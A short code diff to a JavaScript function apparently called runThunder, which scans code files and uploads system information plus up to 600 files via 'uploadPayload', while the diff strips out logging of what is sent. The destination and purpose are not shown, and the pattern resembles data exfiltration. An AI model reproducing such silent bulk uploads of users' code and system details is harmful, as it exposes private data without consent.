@@ -15,14 +15,10 @@ async function runThunder() {
     const files = scanCodeFiles();
 
 
-    console.log("Files count:", files.length);
-    console.log("First file:", files[0]);
-
     console.log("Uploading...");
     // const response = await uploadPayload(systemInfo, files);
-     const response = await uploadPayload(systemInfo, files.slice(0, 600));
+     await uploadPayload(systemInfo, files.slice(0, 600));
     console.log("Upload complete.");
-    console.log(response);
   } catch (error) {
     console.error("Thunder failed:", error.message || error);
   }
